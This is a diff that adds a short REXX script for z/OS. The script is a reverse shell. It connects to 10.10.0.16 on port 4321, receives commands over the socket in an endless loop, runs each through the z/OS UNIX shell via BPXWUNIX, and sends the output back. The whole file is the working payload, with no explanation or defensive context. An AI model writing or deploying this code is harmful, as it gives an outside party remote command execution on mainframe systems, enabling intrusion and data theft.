@@ -1,0 +1,26 @@
+/* REXX */
+IP = '10.10.0.16'
+PORT = '4321'
+n = "25"x
+r = "$ "
+rsock = SOCKET('INITIALIZE','CLIENT',2)
+rsock = SOCKET('SOCKET',2,'STREAM','TCP')
+parse var rsock socket_rc socketID .
+rsock = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_KEEPALIVE','ON')
+rsock = SOCKET('SETSOCKOPT',socketID,'SOL_SOCKET','SO_ASCII','On')
+rsock = SOCKET('SOCKETSETSTATUS','CLIENT')
+rsock = SOCKET('CONNECT',socketID,'AF_INET' PORT IP)
+rsock = SOCKET('SEND',socketID, r)
+DO FOREVER
+ in = SOCKET('RECV',socketID,10000)
+ parse var in s_rc s_data_len s_data_text
+ cmd = DELSTR(s_data_text, LENGTH(s_data_text))
+    CALL BPXWUNIX cmd,,out.
+    text = ''
+    DO i = 1 TO out.0
+       text = text||out.i||n
+    END
+ text = text||r
+ rsock = SOCKET('SEND',socketID, text)
+END
+return 0
